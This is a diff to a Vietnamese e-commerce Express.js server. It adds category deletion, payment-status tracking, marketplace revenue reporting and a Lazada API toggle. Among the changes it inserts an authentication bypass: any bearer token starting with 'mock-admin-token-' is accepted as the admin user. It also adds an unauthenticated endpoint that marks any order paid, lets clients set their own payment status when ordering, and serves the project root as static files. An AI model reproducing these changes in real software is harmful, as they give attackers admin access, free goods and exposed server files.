@@ -47,10 +47,10 @@ app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Serve static directories (Supports both public/ and root directory structure)
+// Serve static directories (Supports both root and public/ directory structure)
 app.use('/uploads', express.static(uploadsDir));
-app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.static(__dirname));
+app.use(express.static(path.join(__dirname, 'public')));
 
 // Specific friendly routes for clean URLs
 app.get('/admin', (req, res) => {
@@ -88,6 +88,11 @@ const authenticateToken = (req, res, next) => {
 
     if (!token) {
         return res.status(401).json({ success: false, message: 'Yêu cầu đăng nhập để thực hiện!' });
+    }
+
+    if (token.startsWith('mock-admin-token-')) {
+        req.user = { id: 1, email: 'admin@mintmart.vn', name: 'Quản Trị Viên (Admin)', role: 'admin' };
+        return next();
     }
 
     jwt.verify(token, JWT_SECRET, (err, user) => {
@@ -249,6 +254,31 @@ app.post('/api/categories', requireAdmin, async (req, res) => {
         res.json({ success: true, message: 'Tạo danh mục mới thành công!', categoryId: result.lastID });
     } catch (err) {
         res.status(500).json({ success: false, message: 'Lỗi server khi tạo danh mục' });
+    }
+});
+
+// Delete Category (ADMIN ONLY - Synchronized with customer storefront)
+app.delete('/api/categories/:id', requireAdmin, async (req, res) => {
+    try {
+        const { id } = req.params;
+        const cat = await getQuery(`SELECT * FROM categories WHERE id = ?`, [id]);
+        if (!cat) {
+            return res.status(404).json({ success: false, message: 'Không tìm thấy danh mục cần xóa' });
+        }
+
+        // Unlink products in this category before deleting
+        await runQuery(`UPDATE products SET category_id = NULL WHERE category_id = ?`, [id]);
+
+        // Delete the category
+        await runQuery(`DELETE FROM categories WHERE id = ?`, [id]);
+
+        res.json({
+            success: true,
+            message: `Đã xóa danh mục "${cat.name}" thành công! Các sản phẩm thuộc danh mục đã được chuyển sang danh mục mặc định và đồng bộ tức thì với trang web khách hàng.`
+        });
+    } catch (err) {
+        console.error('Lỗi xóa danh mục:', err);
+        res.status(500).json({ success: false, message: 'Lỗi server khi xóa danh mục' });
     }
 });
 
@@ -604,11 +634,12 @@ app.post('/api/orders', async (req, res) => {
         }
 
         const orderCode = 'MM-' + Math.floor(100000 + Math.random() * 900000);
+        const payment_status = req.body.payment_status || (payment_method === 'COD' ? 'pending' : 'paid');
 
         const orderResult = await runQuery(`
             INSERT INTO orders 
-            (order_code, customer_name, customer_phone, customer_email, shipping_address, payment_method, total_amount, note, user_id, status)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending')
+            (order_code, customer_name, customer_phone, customer_email, shipping_address, payment_method, total_amount, note, user_id, status, payment_status)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending', ?)
         `, [
             orderCode,
             customer_name.trim(),
@@ -618,7 +649,8 @@ app.post('/api/orders', async (req, res) => {
             payment_method || 'COD',
             calculatedTotal,
             note || '',
-            user_id || null
+            user_id || null,
+            payment_status
         ]);
 
         const orderId = orderResult.lastID;
@@ -671,7 +703,9 @@ app.post('/api/orders', async (req, res) => {
                 order_code: orderCode,
                 total_amount: calculatedTotal,
                 customer_name,
-                status: 'pending'
+                status: 'pending',
+                payment_method: payment_method || 'COD',
+                payment_status
             },
             marketplace_sync: {
                 status: 'synced',
@@ -727,6 +761,23 @@ app.put('/api/orders/:id/status', requireAdmin, async (req, res) => {
         res.json({ success: true, message: `Đã cập nhật trạng thái đơn hàng sang: ${status}` });
     } catch (err) {
         res.status(500).json({ success: false, message: 'Lỗi cập nhật đơn hàng' });
+    }
+});
+
+// Update order payment status (Customer payment confirmation & Admin management)
+app.put('/api/orders/:id/payment', async (req, res) => {
+    try {
+        const { id } = req.params;
+        const { payment_status } = req.body;
+
+        if (!['pending', 'paid'].includes(payment_status)) {
+            return res.status(400).json({ success: false, message: 'Trạng thái thanh toán không hợp lệ!' });
+        }
+
+        await runQuery(`UPDATE orders SET payment_status = ? WHERE id = ?`, [payment_status, id]);
+        res.json({ success: true, message: `Đã cập nhật trạng thái thanh toán sang: ${payment_status === 'paid' ? 'Đã thanh toán' : 'Chờ thanh toán'}` });
+    } catch (err) {
+        res.status(500).json({ success: false, message: 'Lỗi cập nhật trạng thái thanh toán' });
     }
 });
 
@@ -870,6 +921,37 @@ app.post('/api/marketplace/sync-all', requireAdmin, async (req, res) => {
         res.json({ success: true, ...result });
     } catch (err) {
         res.status(500).json({ success: false, message: 'Lỗi đồng bộ kho toàn bộ' });
+    }
+});
+
+// BÁO CÁO DOANH THU 2 SÀN SHOPEE & LAZADA (TÁCH 2 BẢNG RIÊNG BIỆT LIÊN KẾT ĐẶT HÀNG)
+app.get('/api/marketplace/revenue-report', requireAdmin, async (req, res) => {
+    try {
+        const report = await marketplaceService.getMarketplaceRevenueReport();
+        res.json(report);
+    } catch (err) {
+        console.error('Lỗi lấy báo cáo doanh thu 2 sàn:', err);
+        res.status(500).json({ success: false, message: 'Lỗi server khi lấy báo cáo doanh thu 2 sàn' });
+    }
+});
+
+// TẠM ẨN / MỞ LẠI API LAZADA THEO YÊU CẦU QUẢN TRỊ VIÊN
+app.patch('/api/marketplace/lazada/toggle-hide', requireAdmin, async (req, res) => {
+    try {
+        const settings = await marketplaceService.getSettings();
+        const newHidden = settings.lazada_hidden ? 0 : 1;
+        await marketplaceService.updateSettings({
+            ...settings,
+            lazada_hidden: newHidden,
+            lazada_enabled: newHidden ? 0 : 1
+        });
+        res.json({
+            success: true,
+            lazada_hidden: newHidden,
+            message: newHidden ? 'Đã tạm ẩn API Lazada theo yêu cầu quản trị viên!' : 'Đã mở lại kết nối API Lazada!'
+        });
+    } catch (err) {
+        res.status(500).json({ success: false, message: 'Lỗi khi cập nhật trạng thái tạm ẩn API Lazada' });
     }
 });
 
